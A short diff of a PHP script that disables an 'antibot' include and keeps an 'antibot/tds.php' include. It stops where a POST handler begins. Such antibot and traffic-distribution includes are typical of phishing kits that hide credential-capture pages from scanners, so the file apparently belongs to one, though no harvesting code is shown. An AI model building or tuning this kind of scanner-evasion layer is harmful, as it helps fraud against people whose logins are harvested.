@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-include '../antibot.php';
+// ANTIBOT DISABLED - include..antibot.php';
 include '../antibot/tds.php';
  
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
